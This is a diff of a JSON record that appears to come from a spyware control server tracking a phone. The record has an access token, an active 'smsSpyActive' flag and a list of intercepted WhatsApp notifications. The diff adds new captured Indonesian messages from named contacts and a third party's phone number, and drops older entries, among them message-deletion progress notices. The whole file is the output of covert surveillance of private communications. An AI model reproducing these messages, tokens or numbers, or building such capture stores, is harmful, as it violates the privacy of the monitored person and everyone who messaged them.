@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "00613901ddb20be7b9614da5e8ef8e90",
-    "lastSeen": 1776908716422,
+    "lastSeen": 1776908740467,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T07:08:58.851Z",
@@ -20,6 +20,54 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎62 pesan dari 39 chat",
+        "time": "23/04 09:45",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776908716938
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "Nakan",
+        "content": "yaudah nanti aja, aku mau makan dulu",
+        "time": "23/04 09:45",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776908716923
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "+62 821-4849-9859",
+        "content": "KLO sdh selsai bantu peembersihan kantin ya",
+        "time": "23/04 09:45",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776908716914
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "Khifrandev Solution",
+        "content": "boleh kak di 400rb nanti buat lebih simple dari itu kak",
+        "time": "23/04 09:45",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776908716816
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "Maya",
+        "content": "aku tadi pas dibilang jangan chat ga aku chat",
+        "time": "23/04 09:45",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776908716767
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "Rafly",
+        "content": "kalo mau nunggu bang reno ini",
+        "time": "23/04 09:45",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776908716624
+      },
       {
         "appName": "WhatsApp",
         "sender": "Meii",
@@ -3971,54 +4019,6 @@
         "time": "22/04 19:45",
         "pkg": "com.whatsapp",
         "receivedAt": 1776858350862
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎61 pesan dari 38 chat",
-        "time": "22/04 19:44",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776858279780
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "Khifrandev Solution",
-        "content": "di 1.5jt kak sudah termasuk hosting dan domain",
-        "time": "22/04 19:44",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776858279487
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎60 pesan dari 37 chat",
-        "time": "22/04 19:44",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776858258955
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "prily 🤍",
-        "content": "keren",
-        "time": "22/04 19:44",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776858258645
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "Menghapus pesan…",
-        "content": "‎1043 dari 2234 (46%)",
-        "time": "22/04 19:43",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776858227638
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "Menghapus pesan…",
-        "content": "‎943 dari 2234 (42%)",
-        "time": "22/04 19:43",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776858227123
       }
     ],
     "galleryPhotos": [],
